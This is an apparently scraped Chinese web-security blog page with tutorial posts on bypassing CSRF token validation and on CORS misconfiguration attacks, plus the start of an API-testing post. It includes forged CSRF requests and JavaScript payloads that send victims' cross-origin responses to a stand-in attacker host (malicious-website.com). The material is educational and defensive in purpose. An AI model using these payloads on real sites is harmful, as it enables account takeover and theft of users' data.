    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>在本节中，我们将解释什么是 CSRF 令牌，它们如何防范 CSRF 攻击，以及攻击者可能如何绕过这些防御措施。</p>
<h2 id="什么是-CSRF-令牌？"><a href="#什么是-CSRF-令牌？" class="headerlink" title="什么是 CSRF 令牌？"></a>什么是 CSRF 令牌？</h2><p>CSRF 令牌是由服务器端应用程序生成并与客户端共享的唯一、保密且不可预测的值。当客户端发起执行敏感操作的请求（例如提交表单）时，必须包含正确的 CSRF 令牌。否则，服务器将拒绝执行所请求的操作。</p>
<p>一种常见的与客户端共享 CSRF 令牌的方式是将其作为 HTML 表单中的隐藏参数，例如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;change-email-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;example@normal-website.com&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>&gt;</span> Update email <span class="tag">&lt;/<span class="name">button</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>提交此表单会产生以下请求：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /my-account/change-email HTTP/1.1 </span><br><span class="line">Host: normal-website.com </span><br><span class="line">Content-Length: 70 </span><br><span class="line">Content-Type: application/x-www-form-urlencoded  </span><br><span class="line"></span><br><span class="line">csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&amp;email=example@normal-website.com</span><br></pre></td></tr></table></figure>
<p>如果实现正确，CSRF 令牌可以使攻击者难以代表受害者构造有效的请求，从而有助于防范 CSRF 攻击。由于攻击者无法预测 CSRF 令牌的正确值，他们将无法在恶意请求中包含该令牌。</p>
<p>注意：<br>CSRF 令牌不必作为 POST 请求中的隐藏参数发送。例如，有些应用程序会将 CSRF 令牌放在 HTTP 标头中。令牌的传输方式对整个机制的安全性有重大影响。</p>
<h2 id="CSRF-令牌验证中的常见缺陷"><a href="#CSRF-令牌验证中的常见缺陷" class="headerlink" title="CSRF 令牌验证中的常见缺陷"></a>CSRF 令牌验证中的常见缺陷</h2><p>CSRF 漏洞通常是由于 CSRF 令牌验证存在缺陷而产生的。在本节中，我们将介绍一些使攻击者能够绕过这些防御措施的最常见问题。</p>
<h2 id="CSRF-令牌验证依赖于请求方法"><a href="#CSRF-令牌验证依赖于请求方法" class="headerlink" title="CSRF 令牌验证依赖于请求方法"></a>CSRF 令牌验证依赖于请求方法</h2><p>有些应用程序在请求使用 POST 方法时会正确验证令牌，但在使用 GET 方法时会跳过验证。</p>
<p>在这种情况下，攻击者可以切换到 GET 方法来绕过验证并实施 CSRF 攻击：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /email/change?email=pwned@evil-user.net HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</span><br></pre></td></tr></table></figure>
<p>CSRF 令牌验证依赖于令牌是否存在<br>有些应用程序在令牌存在时会正确验证，但如果省略令牌则会跳过验证。</p>
<p>在这种情况下，攻击者可以移除包含令牌的整个参数（而不仅仅是其值）来绕过验证并实施 CSRF 攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /email/change HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Content-Length: 25 </span><br><span class="line">Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm  </span><br><span class="line"></span><br><span class="line">email=pwned@evil-user.net</span><br></pre></td></tr></table></figure>
<h2 id="CSRF-令牌未与用户会话绑定"><a href="#CSRF-令牌未与用户会话绑定" class="headerlink" title="CSRF 令牌未与用户会话绑定"></a>CSRF 令牌未与用户会话绑定</h2><p>有些应用程序不会验证令牌是否属于发出请求的用户的同一会话。相反，应用程序会维护一个已发出令牌的全局池，并接受该池中出现的任何令牌。</p>
<p>在这种情况下，攻击者可以使用自己的账户登录应用程序，获取一个有效令牌，然后在 CSRF 攻击中将该令牌提供给受害用户。</p>
<h2 id="CSRF-令牌与非会话-Cookie-绑定"><a href="#CSRF-令牌与非会话-Cookie-绑定" class="headerlink" title="CSRF 令牌与非会话 Cookie 绑定"></a>CSRF 令牌与非会话 Cookie 绑定</h2><p>作为上述漏洞的一种变体，有些应用程序确实会将 CSRF 令牌与 Cookie 绑定，但不是与会话跟踪所使用的同一个 Cookie 绑定。当应用程序使用两个不同的框架（一个用于会话处理，一个用于 CSRF 保护）且它们没有集成在一起时，就很容易出现这种情况：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /email/change HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Content-Length: 68 </span><br><span class="line">Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv  </span><br><span class="line"></span><br><span class="line">csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com</span><br></pre></td></tr></table></figure>
<p>这种情况更难利用，但仍然存在漏洞。如果网站包含任何允许攻击者在受害者浏览器中设置 Cookie 的行为，那么攻击就有可能实现。攻击者可以使用自己的账户登录应用程序，获取一个有效令牌和相关的 Cookie，利用设置 Cookie 的行为将自己的 Cookie 放入受害者的浏览器中，并在 CSRF 攻击中将自己的令牌提供给受害者。</p>
<p>注意：<br>设置 Cookie 的行为甚至不必存在于与 CSRF 漏洞所在的同一个 Web 应用程序中。如果所控制的 Cookie 具有合适的作用域，那么同一整体 DNS 域内的任何其他应用程序都有可能被用来在目标应用程序中设置 Cookie。例如，可以利用 staging.demo.normal-website.com 上的 Cookie 设置功能来放置一个会提交到 secure.normal-website.com 的 Cookie。</p>
<h2 id="CSRF-令牌简单地复制到-Cookie-中"><a href="#CSRF-令牌简单地复制到-Cookie-中" class="headerlink" title="CSRF 令牌简单地复制到 Cookie 中"></a>CSRF 令牌简单地复制到 Cookie 中</h2><p>作为上述漏洞的进一步变体，有些应用程序不会维护已发出令牌的任何服务器端记录，而是将每个令牌同时复制到 Cookie 和请求参数中。在验证后续请求时，应用程序只是验证请求参数中提交的令牌是否与 Cookie 中提交的值匹配。这有时被称为针对 CSRF 的 “双重提交” 防御，因其易于实现且无需任何服务器端状态而受到推崇：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /email/change HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Content-Length: 68 </span><br><span class="line">Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa  </span><br><span class="line"></span><br><span class="line">csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.com</span><br></pre></td></tr></table></figure>
<p>在这种情况下，如果网站包含任何设置 Cookie 的功能，攻击者仍然可以实施 CSRF 攻击。在这里，攻击者无需获取自己的有效令牌。他们只需编造一个令牌（如果有格式检查，可能需要符合所需格式），利用设置 Cookie 的行为将自己的 Cookie 放入受害者的浏览器中，并在 CSRF 攻击中将该令牌提供给受害者。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://amiduai.github.io/2025/02/15/CSRF(2)/" data-id="cm74z60hs0001ve6s04pkh6t0" data-title="绕过 CSRF 令牌验证" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CORS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/15/CORS/" class="article-date">
  <time class="dt-published" datetime="2025-02-14T16:07:17.000Z" itemprop="datePublished">2025-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/15/CORS/">CORS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>在本节中，我们将解释跨源资源共享（CORS）是什么，描述一些基于跨源资源共享的常见攻击示例，并讨论如何防范这些攻击。</p>
<h2 id="什么是-CORS（跨源资源共享）？"><a href="#什么是-CORS（跨源资源共享）？" class="headerlink" title="什么是 CORS（跨源资源共享）？"></a>什么是 CORS（跨源资源共享）？</h2><p>跨源资源共享（CORS）是一种浏览器机制，它允许对特定域之外的资源进行受控访问。它扩展了同源策略（SOP）并增加了其灵活性。然而，如果网站的 CORS 策略配置和实施不当，它也会为跨域攻击提供可乘之机。CORS 并不能防范诸如跨站请求伪造（CSRF）之类的跨源攻击 。</p>
<p><img src="/images/cors.jpg" alt="跨源资源共享示意图"></p>
<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略是一种限制性的跨源规范，它限制了网站与源域之外的资源进行交互的能力。同源策略是多年前为应对潜在的恶意跨域交互（例如一个网站窃取另一个网站的私人数据）而制定的。它通常允许一个域向其他域发出请求，但不允许访问响应内容。</p>
<h2 id="同源策略的放宽"><a href="#同源策略的放宽" class="headerlink" title="同源策略的放宽"></a>同源策略的放宽</h2><p>同源策略非常严格，因此人们想出了各种方法来规避这些限制。许多网站以需要完全跨源访问的方式与子域或第三方站点进行交互。使用跨源资源共享（CORS）可以对同源策略进行有控制的放宽。</p>
<p>跨源资源共享协议使用一组 HTTP 头，这些头定义了受信任的网络源以及相关属性，例如是否允许经过身份验证的访问。这些头在浏览器与它试图访问的跨源网站之间的头信息交换中组合使用。</p>
<h2 id="由-CORS-配置问题引发的漏洞"><a href="#由-CORS-配置问题引发的漏洞" class="headerlink" title="由 CORS 配置问题引发的漏洞"></a>由 CORS 配置问题引发的漏洞</h2><p>许多现代网站使用 CORS 来允许来自子域和受信任第三方的访问。它们对 CORS 的实现可能存在错误，或者为了确保一切正常运行而过于宽松，这可能会导致可被利用的漏洞。</p>
<h3 id="根据客户端指定的-Origin-头发送服务器生成的-ACAO-头"><a href="#根据客户端指定的-Origin-头发送服务器生成的-ACAO-头" class="headerlink" title="根据客户端指定的 Origin 头发送服务器生成的 ACAO 头"></a>根据客户端指定的 Origin 头发送服务器生成的 ACAO 头</h3><p>一些应用程序需要向多个其他域提供访问权限。维护一个允许的域列表需要持续的努力，而且任何错误都可能导致功能出现问题。因此，一些应用程序选择了简单的方法，实际上允许来自任何其他域的访问。<br>实现这一点的一种方法是读取请求中的 Origin 头，并在响应头中声明允许请求的源。例如，假设一个应用程序收到以下请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /sensitive-victim-data HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: https://malicious-website.com </span><br><span class="line">Cookie: sessionid=...</span><br></pre></td></tr></table></figure>
<p>然后它的响应如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https://malicious-website.com </span><br><span class="line">Access-Control-Allow-Credentials: true ...</span><br></pre></td></tr></table></figure>
<p>这些头信息表明允许来自请求域（malicious-website.com）的访问，并且跨源请求可以包含 cookie（Access-Control-Allow-Credentials: true），因此将在会话中进行处理。</p>
<p>因为应用程序在 Access-Control-Allow-Origin 头中反映任意来源，这意味着任何域都可以访问易受攻击域的资源。如果响应包含任何敏感信息，例如 API 密钥或 CSRF 令牌，您可以通过在自己的网站上放置以下脚本来获取这些信息：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">req.<span class="property">onload</span> = reqListener; </span><br><span class="line">req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;https://vulnerable-website.com/sensitive-victim-data&#x27;</span>,<span class="literal">true</span>); </span><br><span class="line">req.<span class="property">withCredentials</span> = <span class="literal">true</span>; req.<span class="title function_">send</span>(); </span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) &#123;     </span><br><span class="line">       location=<span class="string">&#x27;//malicious-website.com/log?key=&#x27;</span>+<span class="variable language_">this</span>.<span class="property">responseText</span>; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="解析-Origin-头时出错"><a href="#解析-Origin-头时出错" class="headerlink" title="解析 Origin 头时出错"></a>解析 Origin 头时出错</h3><p>一些支持来自多个源访问的应用程序通过使用允许来源的白名单来实现这一点。当收到 CORS 请求时，会将提供的来源与白名单进行比较。如果来源出现在白名单中，那么它将被反映在 Access-Control-Allow-Origin 头中，从而授予访问权限。例如，应用程序收到一个正常请求，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /data HTTP/1.1 </span><br><span class="line">Host: normal-website.com </span><br><span class="line">... </span><br><span class="line">Origin: https://innocent-website.com</span><br></pre></td></tr></table></figure>
<p>应用程序会将提供的来源与它的允许来源列表进行检查，如果在列表中，则如下反映来源：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">... </span><br><span class="line">Access-Control-Allow-Origin: https://innocent-website.com</span><br></pre></td></tr></table></figure>
<p>在实现 CORS 来源白名单时经常会出现错误。一些组织决定允许来自其所有子域（包括尚未存在的未来子域）的访问。还有一些应用程序允许来自其他各种组织的域（包括其子域）的访问。这些规则通常通过匹配 URL 前缀或后缀，或使用正则表达式来实现。实现过程中的任何错误都可能导致向意外的外部域授予访问权限。</p>
<p>例如，假设一个应用程序授予对所有以<a target="_blank" rel="noopener" href="http://normal-website.com结尾的域的访问权限.攻击者可能通过注册http//hackersnormal-website.com%E5%9F%9F%E6%9D%A5%E8%8E%B7%E5%BE%97%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E3%80%82%E6%88%96%E8%80%85%EF%BC%8C%E5%81%87%E8%AE%BE%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%88%E4%BA%88%E5%AF%B9%E6%89%80%E6%9C%89%E4%BB%A5http://normal-website.com%E5%BC%80%E5%A4%B4%E7%9A%84%E5%9F%9F%E7%9A%84%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E8%83%BD%E4%BD%BF%E7%94%A8http://normal-website.com.evil-user.net%E5%9F%9F%E6%9D%A5%E8%8E%B7%E5%BE%97%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E3%80%82">http://normal-website.com结尾的域的访问权限。攻击者可能通过注册http://hackersnormal-website.com域来获得访问权限。或者，假设一个应用程序授予对所有以http://normal-website.com开头的域的访问权限。攻击者可能使用http://normal-website.com.evil-user.net域来获得访问权限。</a></p>
<h3 id="白名单中的-null-来源值"><a href="#白名单中的-null-来源值" class="headerlink" title="白名单中的 null 来源值"></a>白名单中的 null 来源值</h3><p>Origin 头的规范支持 null 值。浏览器可能在各种不寻常的情况下在 Origin 头中发送 null 值：跨源重定向；来自序列化数据的请求；使用 file: 协议的请求；沙盒化的跨源请求。<br>一些应用程序可能会将 null 来源列入白名单，以支持应用程序的本地开发。例如，假设一个应用程序收到以下跨源请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /sensitive-victim-data </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: null</span><br></pre></td></tr></table></figure>
<p>服务器响应如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: null </span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
<p>在这种情况下，攻击者可以使用各种技巧生成一个 Origin 头中包含 null 值的跨源请求。这将满足白名单要求，从而导致跨域访问。例如，可以使用如下形式的沙盒化 iframe 跨源请求来实现：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-scripts allow-top-navigation</span></span></span><br><span class="line"><span class="string"><span class="tag">allow-forms&quot;</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;script&gt; </span></span></span><br><span class="line"><span class="string"><span class="tag">    var req = new XMLHttpRequest(); </span></span></span><br><span class="line"><span class="string"><span class="tag">    req.onload = reqListener; </span></span></span><br><span class="line"><span class="string"><span class="tag">    req.open(&#x27;get&#x27;,&#x27;vulnerable-website.com/sensitive-victim-data&#x27;,true); </span></span></span><br><span class="line"><span class="string"><span class="tag">    req.withCredentials = true; req.send();  </span></span></span><br><span class="line"><span class="string"><span class="tag">    function reqListener() </span></span></span><br><span class="line"><span class="string"><span class="tag">    &#123; </span></span></span><br><span class="line"><span class="string"><span class="tag">        location=&#x27;malicious-website.com/log?key=&#x27;+this.responseText; </span></span></span><br><span class="line"><span class="string"><span class="tag">    &#125;; </span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="通过-CORS-信任关系利用-XSS-漏洞"><a href="#通过-CORS-信任关系利用-XSS-漏洞" class="headerlink" title="通过 CORS 信任关系利用 XSS 漏洞"></a>通过 CORS 信任关系利用 XSS 漏洞</h3><p>即使是 “正确” 配置的 CORS 也会在两个源之间建立信任关系。如果一个网站信任一个容易受到跨站脚本（XSS）攻击的源，那么攻击者就可以利用 XSS 漏洞注入一些 JavaScript 代码，利用 CORS 从信任这个易受攻击应用程序的网站上检索敏感信息。<br>假设收到以下请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /api/requestApiKey HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: https://subdomain.vulnerable-website.com </span><br><span class="line">Cookie: sessionid=...</span><br></pre></td></tr></table></figure>
<p>如果服务器响应如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com </span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
<p>那么在subdomain.vulnerable-website.com上发现 XSS 漏洞的攻击者就可以利用这个漏洞来检索 API 密钥，使用类似这样的 URL：</p>
<p><a target="_blank" rel="noopener" href="https://subdomain.vulnerable-website.com/?xss=">https://subdomain.vulnerable-website.com/?xss=</a><script>cors-stuff-here</script></p>
<h3 id="配置不当的-CORS-破坏-TLS-安全"><a href="#配置不当的-CORS-破坏-TLS-安全" class="headerlink" title="配置不当的 CORS 破坏 TLS 安全"></a>配置不当的 CORS 破坏 TLS 安全</h3><p>假设一个严格使用 HTTPS 的应用程序也将一个使用普通 HTTP 的受信任子域列入白名单。例如，当应用程序收到以下请求时：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /api/requestApiKey HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: http://trusted-subdomain.vulnerable-website.com </span><br><span class="line">Cookie: sessionid=...</span><br></pre></td></tr></table></figure>
<p>应用程序响应如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com </span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
<p>在这种情况下，能够拦截受害者用户流量的攻击者可以利用 CORS 配置来危害受害者与应用程序的交互。此攻击涉及以下步骤：</p>
<p>受害者用户发出任何普通 HTTP 请求。<br>攻击者注入一个重定向到<a target="_blank" rel="noopener" href="http://trusted-subdomain.vulnerable-website.com./">http://trusted-subdomain.vulnerable-website.com。</a><br>受害者的浏览器跟随重定向。<br>攻击者拦截普通 HTTP 请求，并返回一个包含对<a target="_blank" rel="noopener" href="https://vulnerable-website.com的/">https://vulnerable-website.com的</a> CORS 请求的伪造响应。<br>受害者的浏览器发出 CORS 请求，其中包含来源<a target="_blank" rel="noopener" href="http://trusted-subdomain.vulnerable-website.com./">http://trusted-subdomain.vulnerable-website.com。</a><br>应用程序允许该请求，因为这是一个列入白名单的来源。请求的敏感数据在响应中返回。<br>攻击者的伪造页面可以读取敏感数据并将其传输到攻击者控制的任何域。<br>即使易受攻击的网站在其他方面对 HTTPS 的使用很安全，没有 HTTP 端点，并且所有 cookie 都标记为安全，这种攻击仍然有效。</p>
<h3 id="内联网和无凭据的-CORS"><a href="#内联网和无凭据的-CORS" class="headerlink" title="内联网和无凭据的 CORS"></a>内联网和无凭据的 CORS</h3><p>大多数 CORS 攻击依赖于响应头Access-Control-Allow-Credentials: true的存在。如果没有这个头，受害者用户的浏览器将拒绝发送他们的 cookie，这意味着攻击者只能访问未经身份验证的内容，而他们通过直接浏览目标网站也能同样轻松地访问这些内容。<br>然而，有一种常见的情况是攻击者无法直接访问网站：当它是某个组织内联网的一部分，并且位于私有 IP 地址空间内时。内部网站的安全标准通常低于外部网站，这使得攻击者能够发现漏洞并获得进一步的访问权限。例如，私有网络内的跨源请求可能如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /reader?url=doc1.pdf </span><br><span class="line">Host: intranet.normal-website.com </span><br><span class="line">Origin: https://normal-website.com</span><br></pre></td></tr></table></figure>
<p>服务器响应如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>
<p>应用服务器信任来自任何来源的无凭据资源请求。如果私有 IP 地址空间内的用户访问公共互联网，那么外部站点就可以利用受害者的浏览器作为代理来访问内联网资源，从而进行基于 CORS 的攻击。</p>
<h2 id="如何防范基于-CORS-的攻击"><a href="#如何防范基于-CORS-的攻击" class="headerlink" title="如何防范基于 CORS 的攻击"></a>如何防范基于 CORS 的攻击</h2><p>CORS 漏洞主要是由于配置错误引起的。因此，防范 CORS 漏洞是一个配置问题。以下部分描述了一些针对 CORS 攻击的有效防御措施。</p>
<h3 id="正确配置跨源请求"><a href="#正确配置跨源请求" class="headerlink" title="正确配置跨源请求"></a>正确配置跨源请求</h3><p>如果一个网络资源包含敏感信息，应该在 Access-Control-Allow-Origin 头中正确指定来源。</p>
<h3 id="仅允许受信任的站点"><a href="#仅允许受信任的站点" class="headerlink" title="仅允许受信任的站点"></a>仅允许受信任的站点</h3><p>这似乎是显而易见的，但 Access-Control-Allow-Origin 头中指定的来源应该只是受信任的站点。特别是，在没有验证的情况下动态反映跨源请求中的来源很容易被利用，应该避免这种情况。</p>
<h3 id="避免将-null-列入白名单"><a href="#避免将-null-列入白名单" class="headerlink" title="避免将 null 列入白名单"></a>避免将 null 列入白名单</h3><p>避免使用Access-Control-Allow-Origin: null头。内部文档和沙盒化请求的跨源资源调用可以指定 null 来源。对于私有和公共服务器，应该根据受信任的来源正确定义 CORS 头。</p>
<h3 id="在内部网络中避免使用通配符"><a href="#在内部网络中避免使用通配符" class="headerlink" title="在内部网络中避免使用通配符"></a>在内部网络中避免使用通配符</h3><p>在内部网络中避免使用通配符。当内部浏览器可以访问不受信任的外部域时，仅依靠网络配置来保护内部资源是不够的。</p>
<h3 id="CORS-不能替代服务器端安全策略"><a href="#CORS-不能替代服务器端安全策略" class="headerlink" title="CORS 不能替代服务器端安全策略"></a>CORS 不能替代服务器端安全策略</h3><p>CORS 定义了浏览器的行为，它永远不能替代服务器端对敏感数据的保护 —— 攻击者可以直接伪造来自任何受信任来源的请求。因此，除了正确配置 CORS 之外，Web 服务器还应该继续对敏感数据应用保护措施，例如身份验证和会话管理。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://amiduai.github.io/2025/02/15/CORS/" data-id="cm74zu18q0000d46scl4rcrl9" data-title="CORS" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-API测试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/10/API%E6%B5%8B%E8%AF%95/" class="article-date">
  <time class="dt-published" datetime="2025-02-10T12:07:17.000Z" itemprop="datePublished">2025-02-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/10/API%E6%B5%8B%E8%AF%95/">API测试</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>API（应用程序编程接口）使软件系统和应用程序能够进行通信和共享数据。API测试非常重要，因为API中的漏洞可能会破坏网站的保密性、完整性和可用性等核心方面。</p>
<p>所有动态网站都由API组成，因此经典的Web漏洞（如SQL注入）也可以归类为API测试。在本主题中，我们将教您如何测试网站前端未完全使用的API，重点是RESTful和JSON API。我们还将教您如何测试可能影响内部API的服务器端参数污染漏洞。</p>
<h2 id="API侦察"><a href="#API侦察" class="headerlink" title="API侦察"></a><strong>API侦察</strong></h2><p>要开始API测试，首先需要尽可能多地了解API的信息，以发现其攻击面。</p>
<p>首先，应该识别API端点。这些是API在其服务器上接收关于特定资源的请求的位置。例如，考虑以下GET请求：</p>
<p>复制GET &#x2F;api&#x2F;books HTTP&#x2F;1.1 Host: <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a></p>
